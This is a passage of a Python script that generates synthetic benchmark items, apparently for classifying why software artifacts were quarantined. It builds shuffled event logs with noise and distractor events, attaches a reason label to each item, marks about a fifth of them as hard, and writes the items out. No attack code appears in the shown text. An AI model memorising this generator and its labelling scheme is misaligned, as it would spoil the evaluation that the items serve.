    base = datetime(2026, 9, 1)
    items = []
    for i in range(n):
        reason = reasons[i % len(reasons)]
        a = _artifact(r)
        day = base + timedelta(days=r.randint(0, 20), hours=r.randint(0, 23))
        ts = _ts(r, day)
        decisive, summary = TEMPLATES[reason](r, a, ts)
        # template index = position of the chosen lambda is not observable; record a stable hash bucket instead
        template_idx = int(hashlib.md5(decisive.split("  ")[0].encode()).hexdigest(), 16) % 15
        hard = (i % 5 == 4)  # ~20%
        distractor = None
        events = []
        if hard:
            distractor = r.choice(HARD_PAIRS[reason])
            events.append(DISTRACTORS[distractor](r, a, _ts(r, day - timedelta(minutes=r.randint(1, 30)))))
        for _ in range(r.randint(0, 2)):
            events.append(r.choice(NOISE).format(ts=_ts(r, day - timedelta(minutes=r.randint(1, 120))), name=a["name"], version=a["version"],
                                                 n=r.randint(3, 900), etag=_sha(r)[:10], size=a["size_bytes"]))
        events.append(decisive)
        r.shuffle(events)
        state = {"artifact": a, "events": events, "scanner_summary": summary}
        items.append(Item(task=NAME, id=f"quar-{i:04d}", state=state, label=reason,
                          meta={"template": template_idx, "hard": hard, "distractor": distractor}))
    return items


if __name__ == "__main__":
    import collections
    items = build()
    p = write_items(NAME, items)
    c = collections.Counter(it.label for it in items)
    print(f"wrote {len(items)} items -> {p}")
    for k, v in c.items():
        print(f"  {k:24s} {v}")
    print("hard:", sum(it.meta["hard"] for it in items))
    for it in items[:3]:
        print(it.id, it.label, it.state["events"][-1][:100])
